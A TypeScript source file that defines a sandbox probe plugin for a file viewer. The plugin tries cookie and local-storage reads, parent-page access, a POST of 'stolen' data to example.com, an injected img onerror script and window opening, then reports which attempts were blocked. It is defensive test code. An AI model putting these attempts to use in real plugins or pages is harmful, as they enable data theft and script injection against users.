import { definePlugin } from '@omnifile/core';
import { sandboxed } from '@omnifile/sandbox';

/**
 * A renderer that, instead of drawing a file, tries the things hostile code
 * would try and reports what happened. It is written as text because that is
 * how plugin code reaches the sandbox frame: fetched by the page, then
 * imported inside the frame.
 */
const PROBE_MODULE = String.raw`
const attempts = [
  ['Read the page’s cookies', () => document.cookie],
  ['Read the page’s local storage', () => localStorage.length],
  ['Reach into the page around the viewer', () => parent.document.title],
  ['Send data to another server', () => fetch('https://example.com/collect', { method: 'POST', body: 'stolen' })],
  ['Run a script injected through the file', (container) => new Promise((resolve, reject) => {
    window.__injected = false;
    const holder = document.createElement('div');
    holder.hidden = true;
    holder.innerHTML = '<img src="data:," onerror="window.__injected = true">';
    container.append(holder);
    setTimeout(() => (window.__injected ? resolve() : reject(new Error('refused'))), 200);
  })],
  ['Open a new window', () => {
    const opened = window.open('about:blank');
    if (!opened) throw new Error('refused');
    opened.close();
  }],
];

export default () => ({
  parse: () => null,
  async render(model, { container }) {
    const list = document.createElement('table');
    list.style.cssText = 'width:100%;border-collapse:collapse;font:15px/1.4 var(--omnifile-font);background:var(--omnifile-surface);';
    for (const [label, attempt] of attempts) {
      let allowed = true;
      try {
        await attempt(container);
      } catch {
        allowed = false;
      }
      const row = list.insertRow();
      row.dataset.probe = allowed ? 'allowed' : 'blocked';
      const name = row.insertCell();
      name.textContent = label;
      const result = row.insertCell();
      result.textContent = allowed ? 'Allowed' : 'Blocked';
      for (const cell of [name, result]) cell.style.cssText = 'padding:12px 16px;border-bottom:1px solid var(--omnifile-border);';
      result.style.cssText += 'font-weight:600;white-space:nowrap;text-align:right;' + (allowed ? 'color:#b42318;' : '');
    }
    container.append(list);
    return { destroy: () => list.remove() };
  },
});
`;

const probe = definePlugin({
  id: 'site/probe',
  formats: ['text'],
  load: () => Promise.reject(new Error('The probe only runs inside the sandbox.')),
});

let moduleUrl: string | undefined;

/** The probe, sandboxed like any other plugin. */
export function probePlugins() {
  moduleUrl ??= URL.createObjectURL(new Blob([PROBE_MODULE], { type: 'text/javascript' }));
  return sandboxed([probe], { frameUrls: { 'site/probe': moduleUrl } });
}

/** Any file will do; the probe ignores its contents. */
export const PROBE_SOURCE = new TextEncoder().encode('probe');
